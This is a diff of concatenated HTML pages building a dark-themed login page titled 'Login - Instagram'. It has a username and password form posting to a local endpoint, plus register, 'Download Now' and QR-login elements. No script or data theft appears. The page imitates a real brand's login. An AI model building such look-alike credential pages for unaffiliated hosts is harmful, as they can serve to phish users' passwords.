@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login - Instagram</title>
     <style>
-        /* Basic reset and body styles */
+        /* Basic reset */
         * {
             margin: 0;
             padding: 0;
@@ -13,13 +13,13 @@
         }
 
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
             background-color: black;  /* Changed background to black */
+            color: white;  /* Text color set to white */
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: white;  /* Set text color to white to contrast against the black background */
         }
 
         /* Main container */
@@ -60,9 +60,32 @@
             cursor: pointer;
         }
 
-        /* Green hover effect for the login button */
+        /* Hover effect for the login button */
         button:hover {
             background-color: green;  /* Change background to green on hover */
+        }
+
+        /* Forgot Password Box */
+        .forgot-password-box {
+            margin-top: 10px;  /* Space above the box */
+            padding: 10px;
+            background-color: #f1f1f1;  /* Grey box background */
+            border-radius: 5px;
+            border: 1px solid #dbdbdb;  /* Light border */
+            text-align: center;
+        }
+
+        /* Style for the "Forgot password?" text */
+        .forgot-password {
+            color: grey;  /* Default grey color */
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        /* Hover effect for the "Forgot password?" text */
+        .forgot-password:hover {
+            color: red;  /* Red color on hover */
+            text-decoration: underline;  /* Underline on hover */
         }
 
         /* Footer link styles */
@@ -82,6 +105,34 @@
             text-decoration: underline;
         }
 
+        /* Affiliate link styles */
+        .affiliate-box {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f1f1f1;
+            border-radius: 5px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+        }
+
+        .affiliate-link {
+            font-size: 14px;
+        }
+
+        .need-account {
+            color: grey;
+        }
+
+        .register {
+            color: blue;
+            text-decoration: none;
+        }
+
+        /* Hover effect for the "Register" link */
+        .register:hover {
+            color: green;  /* Green color when hovered */
+        }
+
         /* Optional: Add a little margin for smaller devices */
         @media (max-width: 400px) {
             .login-container {
@@ -92,12 +143,13 @@
 </head>
 <body>
 
+    <!-- Login Container -->
     <div class="login-container">
         <!-- Instagram logo -->
         <div class="logo">
-            <!-- Add Instagram logo image URL here -->
+            <!-- You can add the Instagram logo here -->
         </div>
-        
+
         <!-- Login Form -->
         <form action="/submit" method="post">
             <input type="text" name="username" placeholder="Phone, email, or username" required>
@@ -105,9 +157,17 @@
             <button type="submit">Log in</button>
         </form>
 
-        <!-- Forgot Password Link -->
-        <div class="footer">
-            <a href="password-reset.html">Forgot password?</a>
+        <!-- Forgot Password Box -->
+        <div class="forgot-password-box">
+            <a href="password-reset.html" class="forgot-password">Forgot password?</a>
+        </div>
+
+        <!-- Affiliate Box with Register link -->
+        <div class="affiliate-box">
+            <div class="affiliate-link">
+                <span class="need-account">Need an account? </span>
+                <a href="https://www.example.com/register" class="register">Register</a>
+            </div>
         </div>
     </div>
 
@@ -120,7 +180,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login - Instagram</title>
     <style>
-        /* Basic reset and body styles */
+        /* Basic reset */
         * {
             margin: 0;
             padding: 0;
@@ -128,13 +188,13 @@
         }
 
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
             background-color: black;  /* Changed background to black */
+            color: white;  /* Text color set to white */
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: white;  /* Set text color to white to contrast against the black background */
         }
 
         /* Main container */
@@ -175,9 +235,32 @@
             cursor: pointer;
         }
 
-        /* Green hover effect for the login button */
+        /* Hover effect for the login button */
         button:hover {
             background-color: green;  /* Change background to green on hover */
+        }
+
+        /* Forgot Password Box */
+        .forgot-password-box {
+            margin-top: 10px;  /* Space above the box */
+            padding: 10px;
+            background-color: #f1f1f1;  /* Grey box background */
+            border-radius: 5px;
+            border: 1px solid #dbdbdb;  /* Light border */
+            text-align: center;
+        }
+
+        /* Style for the "Forgot password?" text */
+        .forgot-password {
+            color: grey;  /* Default grey color */
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        /* Hover effect for the "Forgot password?" text */
+        .forgot-password:hover {
+            color: red;  /* Red color on hover */
+            text-decoration: underline;  /* Underline on hover */
         }
 
         /* Footer link styles */
@@ -197,6 +280,34 @@
             text-decoration: underline;
         }
 
+        /* Affiliate link styles */
+        .affiliate-box {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f1f1f1;
+            border-radius: 5px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+        }
+
+        .affiliate-link {
+            font-size: 14px;
+        }
+
+        .need-account {
+            color: grey;
+        }
+
+        .register {
+            color: blue;
+            text-decoration: none;
+        }
+
+        /* Hover effect for the "Register" link */
+        .register:hover {
+            color: green;  /* Green color when hovered */
+        }
+
         /* Optional: Add a little margin for smaller devices */
         @media (max-width: 400px) {
             .login-container {
@@ -207,12 +318,13 @@
 </head>
 <body>
 
+    <!-- Login Container -->
     <div class="login-container">
         <!-- Instagram logo -->
         <div class="logo">
-            <!-- Add Instagram logo image URL here -->
+            <!-- You can add the Instagram logo here -->
         </div>
-        
+
         <!-- Login Form -->
         <form action="/submit" method="post">
             <input type="text" name="username" placeholder="Phone, email, or username" required>
@@ -220,14 +332,22 @@
             <button type="submit">Log in</button>
         </form>
 
-        <!-- Forgot Password Link -->
-        <div class="footer">
-            <a href="password-reset.html">Forgot password?</a>
+        <!-- Forgot Password Box -->
+        <div class="forgot-password-box">
+            <a href="password-reset.html" class="forgot-password">Forgot password?</a>
+        </div>
+
+        <!-- Affiliate Box with Register link -->
+        <div class="affiliate-box">
+            <div class="affiliate-link">
+                <span class="need-account">Need an account? </span>
+                <a href="https://www.example.com/register" class="register">Register</a>
+            </div>
         </div>
     </div>
 
 </body>
-</html><!DOCTYPE html>
+</html>
 
 
 
@@ -242,7 +362,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Top Bar with Download Button</title>
+    <title>Log in with QR Code</title>
     <style>
         /* Basic reset */
         * {
@@ -253,227 +373,192 @@
 
         body {
             font-family: Arial, sans-serif;
-            padding-top: 50px; /* To make sure the content is not hidden behind the top bar */
+            background-color: black;  /* Black background */
+            color: white;  /* White text color */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            margin-top: 50px;  /* Added margin-top to push content below the header */
+            position: relative;
         }
 
-        /* Top bar styles */
-        .top-bar {
-            background-color: #808080; /* Grey background */
-            color: white;
-            height: 50px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0 20px;
+        /* Top Border for the Download Now Link */
+        .top-border {
             position: fixed;
             top: 0;
             width: 100%;
-            z-index: 1000;
+            background-color: black;  /* Black background */
+            border-top: 5px solid grey;  /* Grey top border */
+            padding: 10px 0;
+            text-align: right;
+            z-index: 10;
         }
 
-        /* Button styles */
+        /* Bottom Border */
+        .bottom-border {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background-color: black;  /* Black background */
+            border-bottom: 5px solid grey;  /* Grey bottom border */
+            padding: 10px 0;
+            text-align: center;
+            z-index: 10;
+        }
+
+        /* Left and Right Borders */
+        .left-right-border {
+            position: fixed;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            width: 5px;
+            background-color: grey;  /* Grey left border */
+            z-index: 10;
+        }
+
+        .right-border {
+            position: fixed;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            width: 5px;
+            background-color: grey;  /* Grey right border */
+            z-index: 10;
+        }
+
+        /* Download Now Button */
         .download-btn {
-            background-color: #007bff; /* Blue background */
-            color: white;
-            border: none;
-            padding: 3px 8px; /* Smaller padding */
-            cursor: pointer;
-            border-radius: 15px; /* Rounded corners */
-            font-size: 12px; /* Smaller font size */
-            text-transform: uppercase;
-            white-space: nowrap; /* Prevents text from wrapping */
-            position: absolute;
-            top: 50%; /* Vertically center the button */
-            right: 20px; /* Position the button to the right */
-            transform: translateY(-50%); /* Correct the vertical alignment */
-        }
-
-        /* Button hover effect */
-        .download-btn:hover {
-            background-color: #28a745; /* Green background on hover */
-        }
-    </style>
-</head>
-<body>
-
-    <!-- Top bar with download button -->
-    <div class="top-bar">
-        <span>Some Title</span>
-        <button class="download-btn" onclick="window.location.href='https://www.example.com/download'">Download</button>
-    </div>
-
-</body>
-</html>
-
-
-
-
-
-
-
-
-
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Affiliate Link with Register Hover</title>
-    <style>
-        /* Basic reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: Arial, sans-serif;
-            padding: 20px;
-        }
-
-        /* Style for the affiliate link text */
-        .affiliate-link {
-            font-size: 16px;
-        }
-
-        /* Style for the "Need an account?" text */
-        .need-account {
-            color: grey; /* Grey color for "Need an account?" */
-        }
-
-        /* Style for the "Register" text */
-        .register {
-            color: blue; /* Blue color for "Register" */
-            text-decoration: none; /* Remove underline */
-        }
-
-        /* Hover effect for the "Register" text */
-        .register:hover {
-            color: green; /* Green color when hovered */
-        }
-    </style>
-</head>
-<body>
-
-    <!-- Affiliate Link Section -->
-    <div class="affiliate-link">
-        <span class="need-account">Need an account? </span>
-        <a href="https://www.example.com/register" class="register">Register</a>
-    </div>
-
-</body>
-</html>
-
-
-
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Affiliate Link with Register Hover</title>
-    <style>
-        /* Basic reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: Arial, sans-serif;
-            padding: 20px;
-        }
-
-        /* Style for the login container */
-        .login-container {
-            width: 350px;
-            padding: 30px;
-            background-color: white;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-            border-radius: 5px;
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        /* Forgot password link styles */
-        .footer {
-            margin-top: 20px;
-        }
-
-        .footer a {
-            font-size: 12px;
-            color: #8e8e8e;
+            padding: 8px 20px;
+            background-color: #0095f6;  /* Blue background */
+            color: black;
             text-decoration: none;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* Box for the "Need an account? Register" link */
-        .affiliate-box {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #f1f1f1;
-            border-radius: 5px;
-            border: 1px solid #dbdbdb;
+            border-radius: 50px;  /* Oval shape */
+            font-size: 12px;
             text-align: center;
+            margin-right: 20px;
         }
 
-        /* Style for the affiliate link text */
-        .affiliate-link {
+        .download-btn:hover {
+            background-color: green;  /* Green on hover */
+            color: white;
+        }
+
+        /* Positioning QR Code Content more left, but not all the way to the edge */
+        .qr-content {
+            position: absolute;
+            left: 15%;  /* Adjusted left position to shift content more left */
+            top: 50%;   /* Halfway down the screen */
+            transform: translateY(-50%);  /* Center it vertically */
+            text-align: left;
+            padding-left: 20px;  /* Added padding for better alignment */
+        }
+
+        .login-with-qr {
+            font-size: 18px;
+            font-weight: bold;
+            color: white;  /* White text */
+            text-decoration: none;
+            margin-bottom: 10px;
+        }
+
+        .login-description {
             font-size: 14px;
-        }
-
-        /* Style for the "Need an account?" text */
-        .need-account {
-            color: grey; /* Grey color for "Need an account?" */
-        }
-
-        /* Style for the "Register" text */
-        .register {
-            color: blue; /* Blue color for "Register" */
-            text-decoration: none; /* Remove underline */
-        }
-
-        /* Hover effect for the "Register" text */
-        .register:hover {
-            color: green; /* Green color when hovered */
+            color: white;  /* White text */
         }
     </style>
 </head>
 <body>
 
-    <!-- Login Container -->
-    <div class="login-container">
-        <form action="/submit" method="post">
-            <input type="text" name="username" placeholder="Username" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Log in</button>
-        </form>
+    <!-- Top Border and Download Button -->
+    <div class="top-border">
+        <a href="https://www.example.com/download" class="download-btn">Download Now</a>
+    </div>
 
-        <!-- Forgot Password Link -->
-        <div class="footer">
-            <a href="#">Forgot password?</a>
-        </div>
+    <!-- Log in with QR Code Content Positioned more to the left -->
+    <div class="qr-content">
+        <a href="#" class="login-with-qr">Log in with QR Code</a>
+        <div class="login-description">Scan this with the mobile app to log in instantly.</div>
+    </div>
 
-        <!-- Existing Box for "Need an account? Register" link -->
-        <div class="affiliate-box">
-            <div class="affiliate-link">
-                <span class="need-account">Need an account? </span>
-                <a href="https://www.example.com/register" class="register">Register</a>
-            </div>
-        </div>
+    <!-- Bottom Border -->
+    <div class="bottom-border">
+        <!-- Content here (optional) -->
+    </div>
+
+    <!-- Left and Right Borders -->
+    <div class="left-right-border"></div>
+    <div class="right-border"></div>
+
+</body>
+</html>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in with QR Code</title>
+    <style>
+        /* Basic reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: black;  /* Black background */
+            color: white;  /* White text color */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            margin-top: 50px;  /* Added margin-top to push content below the header */
+            position: relative;
+        }
+
+        /* Positioning QR Code Content more to the left */
+        .qr-content {
+            position: absolute;
+            left: 5%;  /* Moved further left */
+            top: 50%;   /* Halfway down the screen */
+            transform: translateY(-50%);  /* Center it vertically */
+            text-align: left;
+            padding-left: 20px;  /* Added padding for better alignment */
+        }
+
+        .login-with-qr {
+            font-size: 18px;
+            font-weight: bold;
+            color: white;  /* White text */
+            text-decoration: none;
+            margin-bottom: 10px;
+        }
+
+        .login-description {
+            font-size: 14px;
+            color: white;  /* White text */
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Log in with QR Code Content Positioned more to the left -->
+    <div class="qr-content">
+        <a href="#" class="login-with-qr">Log in with QR Code</a>
+        <div class="login-description">Scan this with the mobile app to log in instantly.</div>
     </div>
 
 </body>
 </html>
+
 
 
 
@@ -487,7 +572,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Affiliate Link with Register Hover</title>
+    <title>Log in with QR Code</title>
     <style>
         /* Basic reset */
         * {
@@ -498,208 +583,47 @@
 
         body {
             font-family: Arial, sans-serif;
-            padding: 20px;
+            background-color: black;  /* Black background */
+            color: white;  /* White text color */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            margin-top: 50px;  /* Added margin-top to push content below the header */
         }
 
-        /* Style for the login container */
-        .login-container {
-            width: 350px;
-            padding: 30px;
-            background-color: white;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-            border-radius: 5px;
-            text-align: center;
-            margin-top: 20px;
+        /* Positioning QR Code Content more left and down */
+        .qr-content {
+            position: absolute;
+            left: 5%;  /* Moved further to the left */
+            top: 80%;   /* Increased top value to move it further down */
+            transform: translateY(-50%);  /* Keep it vertically centered */
+            text-align: left;
+            padding-left: 20px;  /* Added padding for better alignment */
         }
 
-        /* Box for the "Forgot password?" link */
-        .forgot-password-box {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #f1f1f1;
-            border-radius: 5px;
-            border: 1px solid #dbdbdb;
-            text-align: center;
+        .login-with-qr {
+            font-size: 18px;
+            font-weight: bold;
+            color: white;  /* White text */
+            text-decoration: none;
+            margin-bottom: 10px;
         }
 
-        /* Box for the "Need an account? Register" link */
-        .affiliate-box {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #f1f1f1;
-            border-radius: 5px;
-            border: 1px solid #dbdbdb;
-            text-align: center;
-        }
-
-        /* Style for the link text */
-        .affiliate-link, .forgot-password-link {
+        .login-description {
             font-size: 14px;
-        }
-
-        /* Style for the "Need an account?" text */
-        .need-account {
-            color: grey; /* Grey color for "Need an account?" */
-        }
-
-        /* Style for the "Register" text */
-        .register {
-            color: blue; /* Blue color for "Register" */
-            text-decoration: none; /* Remove underline */
-        }
-
-        /* Hover effect for the "Register" text */
-        .register:hover {
-            color: green; /* Green color when hovered */
-        }
-
-        /* Style for the "Forgot password?" text */
-        .forgot-password {
-            color: grey; /* Grey color for "Forgot password?" */
-        }
-
-        /* Hover effect for the "Forgot password?" text */
-        .forgot-password:hover {
-            text-decoration: underline; /* Underline when hovered */
-            color: green; /* Green color on hover */
+            color: white;  /* White text */
         }
     </style>
 </head>
 <body>
 
-    <!-- Login Container -->
-    <div class="login-container">
-        <form action="/submit" method="post">
-            <input type="text" name="username" placeholder="Username" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Log in</button>
-        </form>
-
-        <!-- Forgot Password Box -->
-        <div class="forgot-password-box">
-            <div class="forgot-password-link">
-                <a href="#" class="forgot-password">Forgot password?</a>
-            </div>
-        </div>
-
-        <!-- Existing Box for "Need an account? Register" link -->
-        <div class="affiliate-box">
-            <div class="affiliate-link">
-                <span class="need-account">Need an account? </span>
-                <a href="https://www.example.com/register" class="register">Register</a>
-            </div>
-        </div>
+    <!-- Log in with QR Code Content Positioned towards the left and further down -->
+    <div class="qr-content">
+        <a href="#" class="login-with-qr">Log in with QR Code</a>
+        <div class="login-description">Scan this with the mobile app to log in instantly.</div>
     </div>
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Affiliate Link with Register Hover</title>
-        <style>
-            /* Basic reset */
-            * {
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }
-    
-            body {
-                font-family: Arial, sans-serif;
-                padding: 20px;
-            }
-    
-            /* Style for the login container */
-            .login-container {
-                width: 350px;
-                padding: 30px;
-                background-color: white;
-                box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-                border-radius: 5px;
-                text-align: center;
-                margin-top: 20px;
-            }
-    
-            /* Box for the "Forgot password?" link */
-            .forgot-password-box {
-                margin-top: 20px;
-                padding: 15px;
-                background-color: #f1f1f1;
-                border-radius: 5px;
-                border: 1px solid #dbdbdb;
-                text-align: center;
-            }
-    
-            /* Box for the "Need an account? Register" link */
-            .affiliate-box {
-                margin-top: 20px;
-                padding: 15px;
-                background-color: #f1f1f1;
-                border-radius: 5px;
-                border: 1px solid #dbdbdb;
-                text-align: center;
-            }
-    
-            /* Style for the link text */
-            .affiliate-link, .forgot-password-link {
-                font-size: 14px;
-            }
-    
-            /* Style for the "Need an account?" text */
-            .need-account {
-                color: grey; /* Grey color for "Need an account?" */
-            }
-    
-            /* Style for the "Register" text */
-            .register {
-                color: blue; /* Blue color for "Register" */
-                text-decoration: none; /* Remove underline */
-            }
-    
-            /* Hover effect for the "Register" text */
-            .register:hover {
-                color: green; /* Green color when hovered */
-            }
-    
-            /* Style for the "Forgot password?" text */
-            .forgot-password {
-                color: grey; /* Default grey color for "Forgot password?" */
-                transition: color 0.3s, text-decoration 0.3s; /* Smooth transition */
-            }
-    
-            /* Hover effect for the "Forgot password?" text */
-            .forgot-password:hover {
-                color: red; /* Red color on hover */
-                text-decoration: underline; /* Underline when hovered */
-            }
-        </style>
-    </head>
-    <body>
-    
-        <!-- Login Container -->
-        <div class="login-container">
-            <form action="/submit" method="post">
-                <input type="text" name="username" placeholder="Username" required>
-                <input type="password" name="password" placeholder="Password" required>
-                <button type="submit">Log in</button>
-            </form>
-    
-            <!-- Forgot Password Box -->
-            <div class="forgot-password-box">
-                <div class="forgot-password-link">
-                    <a href="#" class="forgot-password">Forgot password?</a>
-                </div>
-            </div>
-    
-            <!-- Existing Box for "Need an account? Register" link -->
-            <div class="affiliate-box">
-                <div class="affiliate-link">
-                    <span class="need-account">Need an account? </span>
-                    <a href="https://www.example.com/register" class="register">Register</a>
-                </div>
-            </div>
-        </div>
-    
-    </body>
-    </html>
-    
+
+</body>
+</html>
